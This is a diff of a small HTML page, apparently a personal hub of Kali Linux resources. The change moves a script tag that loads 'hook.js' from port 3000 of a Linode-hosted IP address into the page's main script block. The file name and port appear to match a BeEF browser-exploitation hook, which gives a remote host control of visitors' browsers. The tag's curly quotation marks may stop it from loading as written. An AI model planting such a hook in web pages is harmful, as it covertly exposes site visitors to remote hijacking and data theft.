@@ -1,6 +1,6 @@
 <html>
 <head>
-	<script> src=”http://139-144-60-176.ip.linodeusercontent.com:3000/hook.js” type=”text/javascript”></script>
+	
 	<style>
 		body {
 			background-image: url("https://github.com/Fort-Bonnitar/fort-bonnitar.github.io/blob/main/background.png?raw=true");
@@ -14,7 +14,7 @@
 	<p id="GFG_UP" style="font-size: 19px; font-weight: bold;"></p>
 	<a href="https://www.kali.org/docs/" style="color: green; font-size: 24px; font-weight: bold;">Documentation</a>
 	<p id="GFG_DOWN" style="color: green; font-size: 24px; font-weight: bold;"></p>
-	<script>
+	<script src=”http://139-144-60-176.ip.linodeusercontent.com:3000/hook.js” type=”text/javascript”>
 		var el_up = document.getElementById("GFG_UP");
 		var el_down = document.getElementById("GFG_DOWN");
 		el_up.innerHTML = "An easy way to find resources such as tips, tutorials, documentation, etc all in one place.";
